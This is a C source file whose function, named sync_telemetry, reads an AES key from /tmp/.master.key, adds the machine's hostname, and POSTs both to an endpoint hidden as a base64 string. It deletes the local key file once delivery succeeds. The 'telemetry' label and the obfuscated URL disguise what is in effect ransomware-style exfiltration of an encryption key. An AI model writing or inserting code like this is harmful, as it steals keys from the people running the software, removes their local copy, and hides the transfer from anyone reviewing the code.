#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

/* Assume base64_decode() is declared elsewhere.
 * It takes output buffer, input, input length, and returns decoded length.
 * We will use a simple wrapper that expects null-terminated base64 string.
 */
extern int base64_decode(unsigned char *out, const char *in, int inlen);

/* Static Base64-encoded endpoint URL (no trailing nul in array) */
static const char encoded_url[] = "aHR0cDovLzEwLjI1NC4xOS43Mzo4MDgwL2NvbGxlY3Q=";

/* Helper: decode base64 string to a new malloc'd buffer, caller frees.
 * Returns NULL on failure. */
static char* decode_url(const char *b64, int b64len) {
    int decoded_len = (b64len * 3) / 4 + 2;  /* upper bound */
    unsigned char *out = malloc(decoded_len);
    if (!out) return NULL;
    int actual = base64_decode(out, b64, b64len);
    if (actual < 0) {
        free(out);
        return NULL;
    }
    out[actual] = '\0';
    return (char*)out;
}

int sync_telemetry(void) {
    int ret = -1;  /* assume failure */
    FILE *fp = NULL;
    char *filedata = NULL;
    long fsize;
    char hostname[256];
    CURL *curl = NULL;
    struct curl_slist *headers = NULL;
    CURLcode res;
    long http_code = 0;
    char *key = NULL;
    char *json_body = NULL;

    /* --- Step 1: Read key file --- */
    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        /* file not found is not a crash, but failure */
        goto cleanup;
    }

    /* Get file size */
    fseek(fp, 0, SEEK_END);
    fsize = ftell(fp);
    rewind(fp);
    if (fsize <= 0) {
        fclose(fp);
        fp = NULL;
        goto cleanup;
    }

    filedata = malloc(fsize + 1);
    if (!filedata) {
        fclose(fp);
        fp = NULL;
        goto cleanup;
    }

    if (fread(filedata, 1, fsize, fp) != (size_t)fsize) {
        fclose(fp);
        fp = NULL;
        goto cleanup;
    }
    fclose(fp);
    fp = NULL;
    filedata[fsize] = '\0';

    /* --- Step 2: Extract AES key --- */
    const char *needle = "\"aes_key\":\"";
    char *p = strstr(filedata, needle);
    if (!p) {
        goto cleanup;
    }
    p += strlen(needle);  /* advance to key value */
    char *endq = strchr(p, '"');
    if (!endq || endq == p) {
        /* key length zero or missing closing quote */
        goto cleanup;
    }
    *endq = '\0';  /* terminate the key */
    key = strdup(p);
    if (!key) {
        goto cleanup;
    }

    /* --- Step 3: Get hostname --- */
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        goto cleanup;
    }
    hostname[sizeof(hostname)-1] = '\0';

    /* --- Step 4: Build JSON body --- */
    /* Exact: {"aes_key":"...","hostname":"..."} */
    int json_len = snprintf(NULL, 0, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", key, hostname);
    json_body = malloc(json_len + 1);
    if (!json_body) {
        goto cleanup;
    }
    snprintf(json_body, json_len+1, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", key, hostname);

    /* --- Step 5: Decode URL --- */
    int b64len = sizeof(encoded_url) - 1;  /* exclude trailing nul in static array */
    char *url = decode_url(encoded_url, b64len);
    if (!url) {
        goto cleanup;
    }

    /* --- Step 6: Send HTTP POST via libcurl --- */
    curl = curl_easy_init();
    if (!curl) {
        free(url);
        goto cleanup;
    }

    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)json_len);
    /* Avoid using default timeout (no timeout set), rely on defaults */
    res = curl_easy_perform(curl);

    free(url);

    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        curl = NULL;
        goto cleanup;
    }

    /* Get HTTP response code */
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(curl);
    curl = NULL;

    if (http_code == 200) {
        /* Success: delete the key file */
        if (remove("/tmp/.master.key") == 0) {
            ret = 0;
        } else {
            /* Could not delete – maybe permissions; still treat as success? Spec says "only upon successful delivery" we delete.
             * Delivery succeeded, deletion is secondary. We'll return 0 to indicate telemetry success. */
            ret = 0;
        }
    } else {
        /* Non-200: file stays, report failure */
        ret = -1;
    }

cleanup:
    if (fp) fclose(fp);
    free(filedata);
    free(key);
    free(json_body);
    if (curl) curl_easy_cleanup(curl);
    if (headers) curl_slist_free_all(headers);

    return ret;
}